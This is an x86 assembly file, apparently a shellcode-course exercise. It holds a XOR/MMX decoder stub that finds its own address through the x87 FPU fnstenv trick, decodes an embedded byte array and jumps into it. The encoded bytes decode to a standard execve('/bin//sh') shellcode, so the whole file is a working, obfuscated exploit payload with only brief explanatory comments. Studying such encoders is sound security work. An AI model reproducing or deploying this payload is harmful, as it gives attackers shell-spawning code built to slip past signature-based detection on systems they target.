;Author: Eduardo
;Filename: mmx_xor_decoder_x87_fpu_fstenv.asm
;A XOR encoded program using x87 FPU data register to get the instruction pointer.
; The prorgam will write into bytes after EncodedShellcode but as it will try to execute EXECVE syscall does not matter because the parent program will be replaced by execve.
;

global _start

section .text
_start:
	fldz
	fnstenv [esp-0xc]
	add esp, 0x10
	pop edi
	;add dl, 0xa	; edi points to FPU instruction pointer (fdlz (line before))
	add edi, 0x27	; 0x27 = 39
	lea esi, [edi +8] ; pointing to EncodedShellcode / mmx operates in 8 bytes of memory
	xor ecx, ecx
	mov cl, 4

decode:
	movq mm0, qword [edi]
	movq mm1, qword [esi]
	pxor mm0, mm1
	movq qword [esi], mm0
	add esi, 0x8
	loop decode

	jmp EncodedShellcode


call_decoder:

	decoder_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
	EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a

